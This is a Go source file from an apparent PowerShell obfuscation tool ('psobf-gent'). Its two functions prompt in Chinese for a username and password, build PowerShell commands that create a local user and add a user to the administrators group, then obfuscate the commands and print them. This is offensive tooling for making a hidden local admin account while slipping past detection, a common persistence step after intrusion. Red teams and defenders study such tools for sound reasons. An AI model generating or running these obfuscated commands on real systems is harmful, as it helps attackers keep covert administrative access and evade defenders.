package user

import (
	"fmt"
	"github.com/pow1e/psobf-gent/pkg/flags"
	"github.com/pow1e/psobf-gent/pkg/obfuscate"
	"github.com/pow1e/psobf-gent/pkg/utils"
	"log"
)

func GenerateCreateUserCommand() {
	if flags.Level == "" {
		log.Fatal("请使用-l参数指定模糊等级")
	}
	var (
		username       string
		password       string
		addUserCommand = "New-LocalUser %s -Password (ConvertTo-SecureString -String '%s' -AsPlainText -Force)"
	)

	fmt.Print("请输入新增用户的用户名:")
	fmt.Scanln(&username)
	fmt.Print("请输入新增用户的密码:")
	fmt.Scanln(&password)
	fmt.Println(username, password)
	addUserCommand = fmt.Sprintf(addUserCommand, username, password)
	obfuscated := obfuscate.GenerateObfuscatedScript(addUserCommand, flags.Level)
	utils.OutputScript(obfuscated)
}

func GenerateAddUserCommand() {
	if flags.Level == "" {
		log.Fatal("请使用-l参数指定模糊等级")
	}
	var (
		username string
		command  = "Add-LocalGroupMember -Group \"administrators\" -Member \"%s\""
	)
	fmt.Print("请输入需要添加到管理员组的用户名:")
	fmt.Scanln(&username)
	command = fmt.Sprintf(command, username)
	obfuscated := obfuscate.GenerateObfuscatedScript(command, flags.Level)
	utils.OutputScript(obfuscated)
}
